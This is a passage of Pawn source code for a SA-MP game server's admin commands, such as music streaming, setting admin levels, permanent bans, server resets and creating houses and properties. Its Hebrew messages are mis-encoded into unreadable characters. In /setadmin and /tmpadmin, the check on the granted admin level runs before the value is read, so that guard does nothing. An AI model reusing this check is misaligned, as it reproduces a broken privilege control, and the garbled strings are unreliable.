			format(adminmusic,sizeof(adminmusic),"");
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][playingmusic])
			{
				StopAudioStreamForPlayer(i);
				playerinfo[i][playingmusic] = 0;
			}
			format(string,sizeof(string)," .ыщсф р· фюхцщўф ьыхьэ %s фрующя",GetName(playerid));
			SendClientMessageToAll(white,string);
		}
		else if(equal(cmd,"play4me"))
		{
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /amusic play4me [url]");
				return SendClientMessage(playerid,red," .°ў ы·хсх· Єэ ёщхю· ю·рщюф щЄсух .YouTube-∙щэ ьс! ьр ыь ёхт ∙ь юхцщўф щЄсху, тэ ьр ўщ∙х°щэ ь");
			}
			playerinfo[playerid][playingmusic] = 0;
			PlayAudioStreamForPlayer(playerid,cmd);
			playerinfo[playerid][playingmusic] = 1;
			SendClientMessage(playerid,white," .р·ф ю∙ющЄ ыЄ· юхцщўф ьЄЎюъ");
		}
		/*else if(equal(cmd,"song"))
		{
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /amusic song [url]");
				return SendClientMessage(playerid,red," .°ў ы·хсх· Єэ ёщхю· ю·рщюф щЄсух .YouTube-∙щэ ьс! ьр ыь ёхт ∙ь юхцщўф щЄсху, тэ ьр ўщ∙х°щэ ь");
			}
			format(adminmusic,sizeof(adminmusic),cmd);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
			{
				playerinfo[i][playingmusic] = 0;
				PlayAudioStreamForPlayer(i,cmd);
				playerinfo[i][playingmusic] = 1;
			}
			format(string,sizeof(string)," .(/play :ьфЇЄьф счц°ф ,/saudio :∙щЁф р· фюхцщўф ∙ь ф∙°· (ьыщсхщ %s фрующя",GetName(playerid));
			SendClientMessageToAll(white,string);
		}
		else if(equal(cmd,"stopsong"))
		{
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /amusic song [url]");
				return SendClientMessage(playerid,red," .°ў ы·хсх· Єэ ёщхю· ю·рщюф щЄсух .YouTube-∙щэ ьс! ьр ыь ёхт ∙ь юхцщўф щЄсху, тэ ьр ўщ∙х°щэ ь");
			}
			format(adminmusic,sizeof(adminmusic),cmd);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
			{
				playerinfo[i][playingmusic] = 0;
				PlayAudioStreamForPlayer(i,cmd);
				playerinfo[i][playingmusic] = 1;
			}
			format(string,sizeof(string)," .(/play :ьфЇЄьф ,/saudio :ю∙ющЄ ыЄ· юхцщўф ьыхьэ (ьыщсхщ %s фрующя",GetName(playerid));
			SendClientMessageToAll(white,string);
		}*/
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/addcomp") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .р·ф ьр с°ыс");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /addcomp [comp id] :Ўх°· ф∙щюх∙");
		AddVehicleComponent(GetPlayerVehicleID(playerid),strval(cmd),playerid);
		if(!IsComponentidCompatible(GetVehicleModel(GetPlayerVehicleID(playerid)), strval(cmd))) RemoveVehicleComponent(GetPlayerVehicleID(playerid), strval(cmd));
		PlaySound(playerid,1133);
		return 1;
	}
	if(equal(cmd,"/remcomp") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .р·ф ьр с°ыс");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /remcomp [comp id] :Ўх°· ф∙щюх∙");
		RemoveVehicleComponent(GetPlayerVehicleID(playerid),strval(cmd));
		PlaySound(playerid,1133);
		return 1;
	}
	if(equal(cmd,"/vspeed") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		new id;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /vspeed [id/name] [x] [y] [z] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		for(new i=0;i<3;i++)
		{
		    cmd = strtok(cmdtext,idx);
			playerinfo[id][speedup][i] = floatstr(cmd);
			if(i < 2) cmd = strtok(cmdtext,idx);
		}
		PlaySound(playerid,1133);
		return 1;
	}
	if(equal(cmd,"/reconnect") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /reconnect [id/name] :Ўх°· ф∙щюх∙");
		new string[M_S], id;
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		//if(id == playerid) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
		format(string,sizeof(string)," *** %s фхЄс° ьф·чс°х· ючу∙ ь∙°· Єь щущ %s",GetName(playerid),GetName(id));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		format(playerinfo[id][reconnecting],16,GetIP(id));
		format(string,sizeof(string),"banip %s",playerinfo[id][reconnecting]);
		SendRconCommand(string);
		return 1;
	}
	if(equal(cmd,"/rvars") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /rvars [id] :Ўх°· ф∙щюх∙");
		new string[M_S], id = strval(cmd);
		if(id < 0 || id > GetMaxPlayers() || IsPlayerNPC(id)) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		format(string,sizeof(string)," *** рщЇё р· ффёшх°щф ∙ь рщщущ %d %s",id,GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		ResetInfo(id);
		return 1;
	}
	if(equal(cmd,"/testconnected") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		TestConnected();
		SendClientMessage(playerid,white," Done.");
		return 1;
	}
	if(equal(cmd,"/moneypickup") && IsPlayerMAdmin(playerid))
	{
	    if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
        cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /moneypickup [amount] :Ўх°· ф∙щюх∙");
		new val = strval(cmd);
		if(val < 0 || val > 99999999) return SendClientMessage(playerid, red, " .ёыхэ ыёє ∙тхщ");
		new Float:x, Float:y, Float:z, str[M_S];
		GetXYInFrontOfPlayer(playerid, x, y, 1.5);
		GetPlayerPos(playerid, z, z, z);
		CreateMoneyPickup(x, y, z, GetPlayerVirtualWorld(playerid), val);
		format(str, sizeof(str), " .щЎ°· ЇщўрЇ сёыхэ ∙ь %d ухь°", val);
		SendClientMessage(playerid, green, str);
		format(str, sizeof(str), "created money pickup: %d$", val);
		Log("Attention", playerid, str);
		AdminInfo(playerid, cmdtext);
		return 1;
	}
	if(equal(cmd, "/loadviewhq") && playerinfo[playerid][admin] == 20)
	{
	    cmd = strtok(cmdtext, idx);
	    LoadViewHQ(strval(cmd));
	    return 1;
	}
	if(equal(cmd, "/unloadviewhq") && playerinfo[playerid][admin] == 20)
	{
	    cmd = strtok(cmdtext, idx);
	    UnloadViewHQ(strval(cmd));
	    return 1;
	}
	if(equal(cmd,"/setadmin") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		new cmd2[256], id, a, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setadmin [id/name] [admin level] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(id == playerid) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
		if(!playerinfo[id][logged]) return SendClientMessage(playerid,red," .Єь ф∙чўя фЁсч° ьфщх· °∙хэ хючхс°");
		if(a > playerinfo[playerid][admin]) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьфЄьх· ∙чўя ь°юф фтсхфф юф°юф ∙ьъ");
		a = strval(cmd2);
		if(a < 0 || a > 20) return SendClientMessage(playerid,red," .°ю· рующя ∙тхщф");
		if(!a)
		{
			fremovekey(file_admins,GetName(id));
			playerinfo[id][adminone] = 0;
		}
		else fsetint(file_admins,GetName(id),a);
		//fsetint(fuser(id),"AdminLevel",a);
		new diff = a - playerinfo[id][admin];
		if(diff > 0)
		{
			format(string,sizeof(string),@c(green) ",юць шхс! ўЇЎ· ы°тЄ %d °юх· срующя\n.юф ∙рхю° ∙°ю· фрующя фЁхычщ· ∙ьъ фщр %d\n\n" @c(red) "!ЁЇ·чх ьъ ф°сф Їўхух· рующя чу∙х· - ∙щэ ьс ∙р·ф юххур юф ыь Їўхуф Єх∙ф ьЇЁщ ∙·∙·ю∙ сф",diff,a);
			ShowPlayerDialog(id,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "Єьщщ· °юф срующя",string,"OK","");
		}
		playerinfo[id][admin] = a, playerinfo[id][showme] = 1;
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· °ю· фрующя ∙ь",a,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· °ю· фрующя ∙ьъ ь %d",a);
		SendClientMessage(id,green,string);
		return 1;
	}
	if(equal(cmd,"/tmpadmin") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		new cmd2[256], id, a, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /tmpadmin [id/name] [admin level] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(id == playerid) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
		if(!playerinfo[id][logged]) return SendClientMessage(playerid,red," .Єь ф∙чўя фЁсч° ьфщх· °∙хэ хючхс°");
		if(a > playerinfo[playerid][admin]) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьфЄьх· ∙чўя ь°юф фтсхфф юф°юф ∙ьъ");
		a = strval(cmd2);
		if(a < 0 || a > 20) return SendClientMessage(playerid,red," .°ю· рующя ∙тхщф");
		playerinfo[id][admin] = a, playerinfo[id][showme] = 1;
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· °ю· фрующя ∙ь",a,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· °ю· фрующя ∙ьъ ь %d",a);
		SendClientMessage(id,green,string);
		return 1;
	}
	if(equal(cmd,"/stream") && IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		format(string,sizeof(string),"Max: %d",playerinfo[playerid][streamedvehiclesmax]);
		SendClientMessage(playerid,white,string);
		for(new i = 0; i < MAX_STREAMED_VEHICLES; i += 10)
		{
			format(string,sizeof(string),"%d,%d,%d,%d",playerinfo[playerid][streamedvehicles][i],playerinfo[playerid][streamedvehicles][i+1],playerinfo[playerid][streamedvehicles][i+2],playerinfo[playerid][streamedvehicles][i+3],playerinfo[playerid][streamedvehicles][i+4]);
			format(string,sizeof(string),"%s | %d,%d,%d,%d",string,playerinfo[playerid][streamedvehicles][i+5],playerinfo[playerid][streamedvehicles][i+6],playerinfo[playerid][streamedvehicles][i+7],playerinfo[playerid][streamedvehicles][i+8],playerinfo[playerid][streamedvehicles][i+9]);
			SendClientMessage(playerid,white,string);
		}
		return 1;
	}
	if(equal(cmd,"/vpatrol-") && IsPlayerMAdmin(playerid) && IsPlayerInAnyVehicle(playerid))
	{
		new Float:p[6];
		GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
		GetVehicleModelInfo(GetVehicleModel(GetPlayerVehicleID(playerid)),VEHICLE_MODEL_INFO_PETROLCAP,p[3],p[4],p[5]);
		CreateObject(1240,p[0]+p[3],p[1]+p[4],p[2]+p[5],0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/serial") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /serial [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," :%s фё°щрь ∙ь",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(playerid,green,GetSerial(id));
		return 1;
	}
	if(equal(cmd,"/permban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		new id, reason[256], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /permban [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		format(string,sizeof(string),"(%d)%s %s PERM BANNED (%d)%s %s [reason: %s]",playerid,GetIP(playerid),GetName(playerid),id,GetIP(id),GetName(id),reason);
		Log("Bans",playerid,string);
		print(string);
		PermBan(id,playerid,reason);
		return 1;
	}
	if(equal(cmd,"/reset") && IsPlayerMAdmin(playerid))
	{
		new secs, m, string[M_S];
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		if(rcd[0]) return SendClientMessage(playerid,red," .ыс° щ∙ °щёш ыЄ·");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /reset [seconds] [mode 1/2] :Ўх°· ф∙щюх∙");
		secs = strval(cmd);
		if(secs < 1 || secs > 600) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ ёЇщ°ф ∙ь щх·° ю600 ∙Ёщх· рх Їчх· ю∙Ёщф");
		cmd = strtok(cmdtext,idx), m = !strlen(cmd) || !IsNumeric(cmd)? 1:strval(cmd);
		if(m < 1 || m > 2) return SendClientMessage(playerid,red," .ёхт °щёш ∙тхщ");
		rcd[0] = 1, rcd[1] = secs, rcd[2] = SetTimer("Reset",1000,1), rcd[3] = m, rcd[4] = playerid;
		format(string,sizeof(string)," - !!!щщЎ° °щёш рхшхюшщ ь∙°· сЄху %d ∙Ёщх· %s фрующя -",secs,GetName(playerid));
		SendClientMessageToAll(red,string);
		SendClientMessageToAll(orange," Х рЁр фю·щЁх ьрующя Єу ∙щхущЄ рэ ю∙фх ю·рЇё рх ьр, °хс фёщыхщщэ ∙∙хэ ус° ьр щ·рЇё ьрє рчу");
		SendClientMessageToAll(orange," Х юЇўух· ўьрЁщэ - фрующя щхущЄ тэ Єь цф, Ёр ьр ь∙рхь");
		SendClientMessageToAll(orange," Х Ёр ьфыЁщё ыёЇщэ ьсЁў, фЁфь· ф∙°· ьр рч°рщ· Єь ыёЇщэ ∙Ёючўх ∙фщх Єьщыэ сцюя ф°щёш");
		SendClientMessageToAll(orange," Х (Ёр ьЎьэ ·юхЁф ∙ь фёшршё ∙ьыэ ьюў°ф ∙·фщф ·ўьф (ьр рюх° ьў°х·");
		if(m == 1)
		{
			SendClientMessageToAll(purple," ╗ (ьрч° ∙фхр щхЇЄь ф∙°· щыхсф ьюёЇ° ∙Ёщх· (сщя 3 ь 15 :exit цфх °щёш юёхт");
			SendClientMessageToAll(purple," ╗ /quit :°Ўхщ ьЎр· ыс° юЄы∙щх ыщ сыь юў°ф ·Ўш°ых ьЎр· юфю∙чў ыущ ьчцх° ь∙°·. ьщЎщрф");
		}
		if(m == 2)
		{
			SendClientMessageToAll(purple," ╗ ьрч° ∙фхр щхЇЄь ыь ф∙чўЁщэ рхшхюшщ· щхЎрх юф∙°· хщхЄс°х ьюёъ фшЄщЁф ∙ь фюху ючу∙ :gmx цфх °щёш юёхт");
			SendClientMessageToAll(purple," ╗ рщя Ўх°ъ ьЎр· юф∙°·, ьрч° ∙·фщф фшЄщЁф ∙ь фюху ьрч° ф°щёш (Єу 15 ∙Ёщх·) р·э ·хыЁёх рхшхюшщ· ь∙°·");
		}
		return 1;
	}
	if(equal(cmd,"/sreset") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		if(!rcd[0]) return SendClientMessage(playerid,red," .рщя °щёш ыЄ·");
		new string[M_S];
		KillTimer(rcd[2]);
		rcd[0] = 0, rcd[1] = 0, rcd[3] = 1, rcd[4] = INVALID_PLAYER_ID;
		format(string,sizeof(string)," - !сщшь р· ф°щёш %s фрующя -",GetName(playerid));
		SendClientMessageToAll(red,string);
		return 1;
	}
	if(equal(cmd,"/createhouse") && IsPlayerMAdmin(playerid))
	{
        if((playerinfo[playerid][admin] < 18 && playerid != ConsoleID) && !PlayerHasRank(playerid,RankID("юЁфьщ с·щэ"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
        new Float:p[3],string[M_S];
        cmd = strtok(cmdtext,idx);
        if(!strlen(cmd)) return SendClientMessage(playerid,red," /createhouse [size] :Ўх°· ф∙щюх∙");
		if(strval(cmd) < 1 || strval(cmd) > 5) return SendClientMessage(playerid,red," .тхуь фсщ· Ў°щъ ьфщх· ю 1 Єу 5");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
	 	CreateHouse(p[0],p[1],p[2],strval(cmd),false);
	 	format(string,sizeof(string)," .%d щЎ°· сюўхэ сх р·ф ЁюЎр р· сщ· юёЇ°",houses);
	 	return SendClientMessage(playerid,green,string);
	}
	if(equal(cmd,"/createbank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_bank,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createammunation") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_ammu,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createwang") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_wang,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createsammunation") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_sammu,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createproperty") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		new cmd2[256], propname[256], Float:p[3], c, e;
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx), propname = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !strlen(propname) || !IsNumeric(cmd) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /createproperty [cost] [earning] [property name] :Ўх°· ф∙щюх∙");
		c = strval(cmd), e = strval(cmd2);
		if(c < 1 || c > 10000000) return SendClientMessage(playerid,red," .ючщ° фЁыё тухь рх ўшя юущ");
		if(e < 1 || e > 1000000) return SendClientMessage(playerid,red," .ёыхэ ўсь· фыёє юфЁыё тухь рх ўшя юущ");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateProperty(p[0],p[1],p[2],c,e,propname,0,"");
		return 1;
	}
	if(equal(cmd,"/clanmanager") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 18 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		new cmd2[64], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /clanmanager [id/name] [manager? yes/no] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"yes"))
		{
			if(PlayerHasRank(id,RankID("юЁфьщ ўьрЁщэ")))
			{
				format(string,sizeof(string)," .ыс° юЁфь ўьрЁщэ %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 1;
		}
		else if(equal(cmd2,"no"))
		{
			if(!PlayerHasRank(id,RankID("юЁфьщ ўьрЁщэ")))
			{
				format(string,sizeof(string)," .ьр юЁфь ўьрЁщэ %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 0;
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· Їўхуф ∙тхщф");
		if(c)
		{
			SendClientMessage(id,green," .фрующя фЇъ рх·ъ ьюЁфь ўьрЁщэ");
			format(string,sizeof(string)," .ьюЁфь ўьрЁщэ %s фЇы· р·",GetName(id));
		}
		else
		{
			SendClientMessage(id,green," .фрующя фх°щу ьъ р· юЁфь фўьрЁщэ");
			format(string,sizeof(string)," .р· фюЁфь ўьрЁщэ %s фх°у· ь",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		playerinfo[id][rank][RankID("юЁфьщ ўьрЁщэ")] = c;
		format(string,sizeof(string),"Rank%02d",RankID("юЁфьщ ўьрЁщэ"));
		fsetint(fuser(id),string,c);
		return 1;
	}
	if(equal(cmd,"/vipmanager") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 18 && !PlayerHasRank(playerid,RankID("юЁфьщ ю∙·ю∙щ ысху"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		new cmd2[64], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /vipmanager [id/name] [manager? yes/no] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"yes"))
		{
			if(PlayerHasRank(id,RankID("юЁфьщ ю∙·ю∙щ ысху")))
			{
				format(string,sizeof(string)," .VIP ыс° юЁфь %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 1;
		}
		else if(equal(cmd2,"no"))
		{
			if(!PlayerHasRank(id,RankID("юЁфьщ ю∙·ю∙щ ысху")))
			{
				format(string,sizeof(string)," .VIP ьр юЁфь %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 0;
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· Їўхуф ∙тхщф");
		if(c)
		{
			SendClientMessage(id,green," .VIP фрующя фЇъ рх·ъ ьюЁфь");
			format(string,sizeof(string)," .VIP ьюЁфь %s фЇы· р·",GetName(id));
		}
		else
		{
			SendClientMessage(id,green," .VIP фрующя фх°щу ьъ р· юЁфь ф");
			format(string,sizeof(string)," .VIP р· юЁфь ф %s фх°у· ь",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		playerinfo[id][rank][RankID("юЁфьщ ю∙·ю∙щ ысху")] = c;
		format(string,sizeof(string),"Rank%02d",RankID("юЁфьщ ю∙·ю∙щ ысху"));
		fsetint(fuser(id),string,c);
		return 1;
	}
